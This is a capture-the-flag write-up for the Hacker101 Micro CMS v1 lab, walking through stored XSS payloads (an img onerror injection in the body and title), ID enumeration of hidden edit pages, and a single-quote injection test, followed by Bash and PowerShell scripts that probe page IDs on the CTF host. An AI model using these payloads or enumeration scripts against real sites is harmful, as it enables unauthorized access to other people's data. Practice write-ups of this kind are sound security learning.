# Hacker101 CTF: Micro CMS v1

The project page contains a list of two links and a button to create a new page that will be added to the list.

* First, I check the most obvious places, such a source page and request headers, directly in the browser using CTRL+U and F12. This yields nothing.

* Then I explore how the site is structured. I click the first link, "Testing". It turns out these are simple pages displaying a post title and text. The page source code shows nothing special. There is a link to edit the page — I click it. There are two input fields with Markdown formatting support. I try the simplest payload by inserting it into the post body and saving. 

```html
<script>alert()</script>
```
After saving, I'm redirected back to the previous page and see that <script> from my input has been filtered out.

* I try a payload without the triggering word and save again.

```html
<img scr=x onerror=alert()>
```
A pop-up appears — the script works. No flag is visible. I call up the page source and find it there in my code line. First flag found!

* There is also a title field. Let's test it. I insert the same working code as before, but into the title field and save the page. Nothing happens, then I check the source — nothing there either. I try returning to the main page, where my title appears in the list, and voilà! A pop-up appears with the second flag.

* I check the second link. It turns out everything is exactly the same. The flags returned are repeats of the previous ones, meaning each vulnerability gives a separate flag.

* Next test is the page creation mode. I enter random text in the fields, save, and check the page source. I notice an interesting detail — my page, which is third in the list, is created with ID 8: `<a href="page/8">text</a>`. That means pages 3–7 are missing from the list, intentionally or not.

* Looking at the address bar, it's clear that navigation uses a simple GET request like `page/1`, where 1 is the page number. I try sequentially accessing pages 3-7, as well as invalid inputs like 0, -1, and flag. But I only get `404 Not found`.

* Let's go to the edit page where navigation works similarly: `page/edit/1`. I substitute numbers 3–7, 0, -1, and flag again. On page 5, I found the third flag!

* One flag remains. Let's return to the address bar. Since we already noticed that navigation works via numbering, there's a chance of SQL-injection. I tryed to add single quщеу in the end of `page/1'`. Nothing happens. Then I try another address: `page/edit/1'` — success! Got the fourth flag.
  
## Created two simple scripts for practicing `Bash script` and `Powershell script` that automatically test IDOR vulnerabilities:
### Bash script
```bash
BASE_URL="https://7ad74e50dcf3b126520d2ae4315e6e80.ctf.hacker101.com"
IDS=("0" "-1" "flag" "admin" "3" "4" "5" "6" "7" "test")
PATHS=("/page/" "/page/edit/")

check_url() {
    local url="$1"
    local id="$2"
    local path="$3"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout 10 --max-time 15)
    
    if [ $? -eq 0 ]; then
        if [ $response -eq 200 ]; then
            echo "SUCCESS [$response] $id"
        fi
    else
        echo "Connection error"
    fi
}

for path in "${PATHS[@]}"; do
    for id in "${IDS[@]}"; do
        full_url="${BASE_URL}${path}${id}"
        check_url "$full_url" "$id" "$path"
        sleep 0.3
    done
done
```
### Powershell script
```powershell
$base_url = "https://7ad74e50dcf3b126520d2ae4315e6e80.ctf.hacker101.com"
$ids = @("0", "-1", "flag", "admin", "3", "4", "5", "6", "7", "test")
$paths = @("/page/", "/page/edit/")

function check_url {
    param([string]$url, [string]$id, [string]$path)

    try {
        $response = Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            Write-Host "SUCCESS [$($response.StatusCode)] $id" -ForegroundColor Green
        }
    }
    catch {
        if ($_.Exception.Response) {
            $status_code = $_.Exception.Response.StatusCode.value__
            Write-Host "Error: $status_code" -ForegroundColor Red
        } else {
            Write-Host "Connection error" -ForegroundColor Red
        }
    }
}

foreach ($path in $paths) {
    foreach ($id in $ids) {
        $full_url = $base_url + $path + $id
        check_url -url $full_url -id $id -path $path
        Start-Sleep -Milliseconds 300
    }
}
```
